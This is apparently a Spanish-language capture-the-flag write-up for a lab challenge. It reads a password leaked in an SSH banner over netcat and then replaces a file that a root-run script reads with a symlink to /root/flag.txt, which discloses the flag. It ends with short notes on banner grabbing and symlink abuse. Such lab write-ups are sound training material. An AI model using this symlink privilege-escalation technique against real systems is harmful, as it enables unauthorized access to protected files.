## Descripción
Can you abuse the banner?
The server has been leaking some crucial information on chatelaine.cylabacademy.net 29911. Use the leaked information to get to the server.
To connect to the running application use nc chatelaine.cylabacademy.net 29488. From the above information abuse the machine and find the flag in the /root directory.

## Solución
- Nos conectamos primero al puerto que filtra información usando netcat: `nc chatelaine.cylabacademy.net 29911`
- El servidor nos arroja el banner del servicio SSH filtrando una contraseña:
  ```text
  SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
  ```
- Obtenemos la contraseña: `My_Passw@rd_@1234`
- Nos conectamos a la aplicación interactiva en el segundo puerto: `nc chatelaine.cylabacademy.net 29488`
- Nos solicita la contraseña y responde a dos preguntas de cultura de ciberseguridad:
  - `what is the password?` -> `My_Passw@rd_@1234`
  - `What is the top cyber security conference in the world?` -> `DEF CON`
  - `the first hacker ever was known for phreaking(making free phone calls), who was it?` -> `John Draper`
- Al responder correctamente, nos entrega una shell interactiva como el usuario `player@challenge:~$`
- El reto indica que la bandera está en `/root`, pero no tenemos permisos de lectura directa. Sin embargo, al conectarnos el servidor ejecuta como root un script que muestra el contenido de `/home/player/banner`
- Aprovechamos esto manipulando dicho archivo para crear un enlace simbólico (symlink) que apunte a la bandera:
  ```bash
  rm banner
  ln -s /root/flag.txt banner
  ```
- Salimos y volvemos a conectarnos a la aplicación con `nc chatelaine.cylabacademy.net 29488`
- Al reconectarse, el script lee el archivo `banner` (que ahora apunta a `/root/flag.txt`) y nos imprime la bandera en el mensaje de bienvenida

```text
academy{b4nn3r_gr4bb1n9_su((3sfu11y_32c8192b}
```

## Notas Adicionales
- **Banner Grabbing**: Es una técnica de reconocimiento que consiste en conectarse a un puerto abierto para inspeccionar el mensaje inicial o cabecera que envía el servicio (a menudo contiene versiones de software o información mal configurada).
- **Abuso de enlaces simbólicos (Symlink Exploitation)**: Cuando un proceso con privilegios de superusuario (`root`) lee un archivo en el directorio de un usuario común, podemos reemplazar dicho archivo por un enlace simbólico (`ln -s`) apuntando a archivos restringidos para que el proceso privilegiado nos los revele.

## Referencias
- [Netcat Cheat Sheet](https://sansorg.egnyte.com/dl/bUvLzFkH5V)
- [Symbolic Links in Linux (ln command)](https://man7.org/linux/man-pages/man1/ln.1.html)